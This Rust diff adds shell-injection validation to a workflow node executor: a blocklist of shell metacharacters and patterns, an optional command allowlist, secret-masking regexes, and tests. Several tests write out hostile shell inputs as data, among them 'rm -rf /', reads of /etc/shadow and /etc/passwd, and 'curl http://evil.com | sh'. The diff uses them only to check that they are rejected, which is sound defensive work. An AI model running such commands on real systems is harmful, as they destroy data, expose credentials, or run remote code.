@@ -7,6 +7,7 @@ use std::process::Stdio;
 use std::time::Duration;
 
 use serde_json::Value;
+use thiserror::Error;
 use tokio::io::AsyncReadExt;
 use tokio::process::Command;
 use tokio::time::timeout;
@@ -17,42 +18,164 @@ use crate::dag::scheduler::ReadyNode;
 use crate::workflow::ContextBudget;
 
 // ============================================================================
+// Script Validation (TASK-655: Shell Injection Protection)
+// ============================================================================
+
+/// Script validation error types
+#[derive(Debug, Error, Clone, PartialEq)]
+pub enum ScriptValidationError {
+    #[error("Script contains dangerous character: '{0}'")]
+    DangerousCharacter(char),
+
+    #[error("Script contains dangerous pattern: '{0}'")]
+    DangerousPattern(String),
+
+    #[error("Script command not in allowlist")]
+    NotInAllowlist,
+
+    #[error("Script is empty")]
+    EmptyScript,
+}
+
+/// Dangerous shell characters that enable injection attacks
+const DANGEROUS_CHARS: &[char] = &['|', ';', '`', '>', '<', '&'];
+
+/// Dangerous patterns that enable command substitution or injection
+const DANGEROUS_PATTERNS: &[&str] = &[
+    "$(",  // Command substitution
+    "${",  // Variable expansion with potential injection
+    "$()", // Empty command substitution
+    "eval ", // Eval command
+    "exec ", // Exec command
+];
+
+/// Allowed command prefixes (allowlist approach)
+const ALLOWED_PREFIXES: &[&str] = &[
+    "echo ",
+    "printf ",
+    "eket ",
+    "npm ",
+    "npx ",
+    "cargo ",
+    "git ",
+    "node ",
+    "python ",
+    "python3 ",
+    "sh ",
+    "bash ",
+    "cat ",
+    "ls ",
+    "pwd",
+    "cd ",
+    "mkdir ",
+    "cp ",
+    "mv ",
+    "rm ",
+    "test ",
+    "[ ",
+    "exit ",
+    "true",
+    "false",
+    "sleep ",
+    "date",
+    "whoami",
+    "env",
+    "export ",
+    "rustc ",
+    "rustfmt ",
+];
+
+/// Validate script for shell injection vulnerabilities
+///
+/// Uses a two-layer defense:
+/// 1. Blocklist: Rejects scripts containing dangerous characters/patterns
+/// 2. Allowlist: Only permits scripts starting with known-safe commands
+///
+/// # Arguments
+/// * `script` - The shell script to validate
+/// * `strict_allowlist` - If true, also enforce allowlist check
+///
+/// # Returns
+/// * `Ok(())` if script is safe
+/// * `Err(ScriptValidationError)` if script contains injection risks
+pub fn validate_script(script: &str, strict_allowlist: bool) -> Result<(), ScriptValidationError> {
+    let script = script.trim();
+
+    // Check for empty script
+    if script.is_empty() {
+        return Err(ScriptValidationError::EmptyScript);
+    }
+
+    // Layer 1: Check for dangerous characters
+    for c in script.chars() {
+        if DANGEROUS_CHARS.contains(&c) {
+            return Err(ScriptValidationError::DangerousCharacter(c));
+        }
+    }
+
+    // Layer 2: Check for dangerous patterns
+    for pattern in DANGEROUS_PATTERNS {
+        if script.contains(pattern) {
+            return Err(ScriptValidationError::DangerousPattern(pattern.to_string()));
+        }
+    }
+
+    // Layer 3 (optional): Allowlist check
+    if strict_allowlist {
+        let script_lower = script.to_lowercase();
+        let is_allowed = ALLOWED_PREFIXES
+            .iter()
+            .any(|prefix| script_lower.starts_with(&prefix.to_lowercase()));
+
+        if !is_allowed {
+            return Err(ScriptValidationError::NotInAllowlist);
+        }
+    }
+
+    Ok(())
+}
+
+// ============================================================================
 // Script Sanitization (TASK-638: Log Masking)
 // ============================================================================
 
+use once_cell::sync::Lazy;
+use regex::Regex;
+
+/// Pre-compiled sensitive patterns (TASK-657: Regex precompilation optimization)
+/// Avoids compiling 5 regex patterns on every mask_sensitive() call
+static SENSITIVE_PATTERNS: Lazy<Vec<Regex>> = Lazy::new(|| {
+    vec![
+        // Environment variable assignments
+        Regex::new(r"(?i)(?:API_KEY|TOKEN|PASSWORD|SECRET|PRIVATE_KEY|ACCESS_KEY|AUTH)=\S+")
+            .expect("Invalid regex: env vars"),
+        // Bearer tokens
+        Regex::new(r"Bearer\s+\S+").expect("Invalid regex: bearer"),
+        // Basic auth
+        Regex::new(r"Basic\s+[A-Za-z0-9+/=]+").expect("Invalid regex: basic auth"),
+        // GitHub PAT
+        Regex::new(r"ghp_[A-Za-z0-9]+").expect("Invalid regex: github pat"),
+        // Slack tokens
+        Regex::new(r"xoxb-[A-Za-z0-9-]+").expect("Invalid regex: slack token"),
+    ]
+});
+
 /// Mask sensitive patterns in script content
 fn mask_sensitive(s: &str) -> String {
-    use regex::Regex;
-
-    let patterns = [
-        // Environment variable assignments
-        r"(?i)(?:API_KEY|TOKEN|PASSWORD|SECRET|PRIVATE_KEY|ACCESS_KEY|AUTH)=\S+",
-        // Bearer tokens
-        r"Bearer\s+\S+",
-        // Basic auth
-        r"Basic\s+[A-Za-z0-9+/=]+",
-        // GitHub PAT
-        r"ghp_[A-Za-z0-9]+",
-        // Slack tokens
-        r"xoxb-[A-Za-z0-9-]+",
-    ];
-
     let mut result = s.to_string();
-    for pattern in &patterns {
-        if let Ok(re) = Regex::new(pattern) {
-            result = re
-                .replace_all(&result, |caps: &regex::Captures| {
-                    let m = caps.get(0).map_or("", |m| m.as_str());
-                    if let Some(eq_pos) = m.find('=') {
-                        format!("{}***", &m[..=eq_pos])
-                    } else if let Some(space_pos) = m.find(' ') {
-                        format!("{} ***", &m[..space_pos])
-                    } else {
-                        "***".to_string()
-                    }
-                })
-                .to_string();
-        }
+    for re in SENSITIVE_PATTERNS.iter() {
+        result = re
+            .replace_all(&result, |caps: &regex::Captures| {
+                let m = caps.get(0).map_or("", |m| m.as_str());
+                if let Some(eq_pos) = m.find('=') {
+                    format!("{}***", &m[..=eq_pos])
+                } else if let Some(space_pos) = m.find(' ') {
+                    format!("{} ***", &m[..space_pos])
+                } else {
+                    "***".to_string()
+                }
+            })
+            .to_string();
     }
     result
 }
@@ -92,6 +215,9 @@ pub struct ExecutorConfig {
     pub env: HashMap<String, String>,
     /// Shell to use (default: /bin/sh)
     pub shell: String,
+    /// Enable strict allowlist validation (default: false)
+    /// When true, only commands starting with allowed prefixes are permitted
+    pub strict_allowlist: bool,
 }
 
 impl Default for ExecutorConfig {
@@ -100,6 +226,7 @@ impl Default for ExecutorConfig {
             working_dir: None,
             env: HashMap::new(),
             shell: "/bin/sh".to_string(),
+            strict_allowlist: false,
         }
     }
 }
@@ -245,8 +372,21 @@ impl NodeExecutor {
         }
     }
 
-    /// Run a shell command
+    /// Run a shell command with validation
     async fn run_command(&self, script: &str) -> Result<(i32, String, String), std::io::Error> {
+        // TASK-655: Validate script for shell injection
+        if let Err(e) = validate_script(script, self.config.strict_allowlist) {
+            error!(
+                "[NodeExecutor] Script validation failed: {} - script: {}",
+                e,
+                sanitize_script(script, 50)
+            );
+            return Err(std::io::Error::new(
+                std::io::ErrorKind::InvalidInput,
+                format!("Script validation failed: {}", e),
+            ));
+        }
+
         let mut cmd = Command::new(&self.config.shell);
         cmd.arg("-c").arg(script);
 
@@ -482,5 +622,200 @@ mod tests {
         assert!(!result.contains("key1"));
         assert!(!result.contains("tok1"));
         assert!(!result.contains("secret123"));
+    }
+
+    // ========================================================================
+    // TASK-655: Shell Injection Protection Tests
+    // ========================================================================
+
+    #[test]
+    fn test_validate_script_safe_commands() {
+        // Safe commands should pass
+        assert!(validate_script("echo hello", false).is_ok());
+        assert!(validate_script("npm run build", false).is_ok());
+        assert!(validate_script("cargo test", false).is_ok());
+        assert!(validate_script("git status", false).is_ok());
+        assert!(validate_script("ls -la", false).is_ok());
+        assert!(validate_script("pwd", false).is_ok());
+        assert!(validate_script("true", false).is_ok());
+        assert!(validate_script("exit 0", false).is_ok());
+    }
+
+    #[test]
+    fn test_validate_script_rejects_pipe() {
+        let result = validate_script("cat /etc/passwd | grep root", false);
+        assert!(matches!(
+            result,
+            Err(ScriptValidationError::DangerousCharacter('|'))
+        ));
+    }
+
+    #[test]
+    fn test_validate_script_rejects_semicolon() {
+        let result = validate_script("echo hello; rm -rf /", false);
+        assert!(matches!(
+            result,
+            Err(ScriptValidationError::DangerousCharacter(';'))
+        ));
+    }
+
+    #[test]
+    fn test_validate_script_rejects_backtick() {
+        let result = validate_script("echo `whoami`", false);
+        assert!(matches!(
+            result,
+            Err(ScriptValidationError::DangerousCharacter('`'))
+        ));
+    }
+
+    #[test]
+    fn test_validate_script_rejects_redirect_output() {
+        let result = validate_script("echo malicious > /etc/passwd", false);
+        assert!(matches!(
+            result,
+            Err(ScriptValidationError::DangerousCharacter('>'))
+        ));
+    }
+
+    #[test]
+    fn test_validate_script_rejects_redirect_input() {
+        let result = validate_script("cat < /etc/shadow", false);
+        assert!(matches!(
+            result,
+            Err(ScriptValidationError::DangerousCharacter('<'))
+        ));
+    }
+
+    #[test]
+    fn test_validate_script_rejects_background() {
+        let result = validate_script("malicious_script &", false);
+        assert!(matches!(
+            result,
+            Err(ScriptValidationError::DangerousCharacter('&'))
+        ));
+    }
+
+    #[test]
+    fn test_validate_script_rejects_command_substitution() {
+        let result = validate_script("echo $(cat /etc/passwd)", false);
+        assert!(matches!(
+            result,
+            Err(ScriptValidationError::DangerousPattern(_))
+        ));
+    }
+
+    #[test]
+    fn test_validate_script_rejects_variable_expansion() {
+        let result = validate_script("echo ${PATH}", false);
+        assert!(matches!(
+            result,
+            Err(ScriptValidationError::DangerousPattern(_))
+        ));
+    }
+
+    #[test]
+    fn test_validate_script_rejects_eval() {
+        let result = validate_script("eval malicious_code", false);
+        assert!(matches!(
+            result,
+            Err(ScriptValidationError::DangerousPattern(_))
+        ));
+    }
+
+    #[test]
+    fn test_validate_script_rejects_exec() {
+        let result = validate_script("exec /bin/sh", false);
+        assert!(matches!(
+            result,
+            Err(ScriptValidationError::DangerousPattern(_))
+        ));
+    }
+
+    #[test]
+    fn test_validate_script_rejects_empty() {
+        let result = validate_script("", false);
+        assert!(matches!(result, Err(ScriptValidationError::EmptyScript)));
+
+        let result = validate_script("   ", false);
+        assert!(matches!(result, Err(ScriptValidationError::EmptyScript)));
+    }
+
+    #[test]
+    fn test_validate_script_strict_allowlist() {
+        // With strict allowlist, unknown commands should fail
+        let result = validate_script("unknown_command arg", true);
+        assert!(matches!(
+            result,
+            Err(ScriptValidationError::NotInAllowlist)
+        ));
+
+        // Allowed prefixes should pass
+        assert!(validate_script("echo hello", true).is_ok());
+        assert!(validate_script("npm install", true).is_ok());
+        assert!(validate_script("cargo build", true).is_ok());
+        assert!(validate_script("git push", true).is_ok());
+    }
+
+    #[test]
+    fn test_validate_script_allowlist_case_insensitive() {
+        // Allowlist should be case-insensitive
+        assert!(validate_script("ECHO hello", true).is_ok());
+        assert!(validate_script("Echo World", true).is_ok());
+        assert!(validate_script("NPM run test", true).is_ok());
+    }
+
+    #[test]
+    fn test_validate_script_complex_injection_attempts() {
+        // Various injection attempts
+        assert!(validate_script("echo hello && rm -rf /", false).is_err());
+        assert!(validate_script("echo hello || malicious", false).is_err()); // Contains |
+        assert!(validate_script("echo $(whoami)", false).is_err());
+        assert!(validate_script("echo `id`", false).is_err());
+        assert!(validate_script("cat /etc/passwd > /tmp/leak", false).is_err());
+        assert!(validate_script("curl http://evil.com | sh", false).is_err());
+    }
+
+    #[tokio::test]
+    async fn test_executor_rejects_injection() {
+        let executor = NodeExecutor::with_defaults();
+        let node = make_node("INJECT-001", "echo hello; rm -rf /", 10);
+
+        let result = executor.execute(&node).await;
+        assert!(!result.success);
+        assert!(result
+            .error_msg
+            .unwrap()
+            .contains("Script validation failed"));
+    }
+
+    #[tokio::test]
+    async fn test_executor_rejects_command_substitution() {
+        let executor = NodeExecutor::with_defaults();
+        let node = make_node("INJECT-002", "echo $(whoami)", 10);
+
+        let result = executor.execute(&node).await;
+        assert!(!result.success);
+        assert!(result
+            .error_msg
+            .unwrap()
+            .contains("Script validation failed"));
+    }
+
+    #[tokio::test]
+    async fn test_executor_with_strict_allowlist() {
+        let mut config = ExecutorConfig::default();
+        config.strict_allowlist = true;
+
+        let executor = NodeExecutor::new(config);
+
+        // Allowed command should pass
+        let node = make_node("ALLOW-001", "echo hello", 10);
+        let result = executor.execute(&node).await;
+        assert!(result.success);
+
+        // Unknown command should fail
+        let node2 = make_node("ALLOW-002", "unknown_dangerous_cmd", 10);
+        let result2 = executor.execute(&node2).await;
+        assert!(!result2.success);
     }
 }
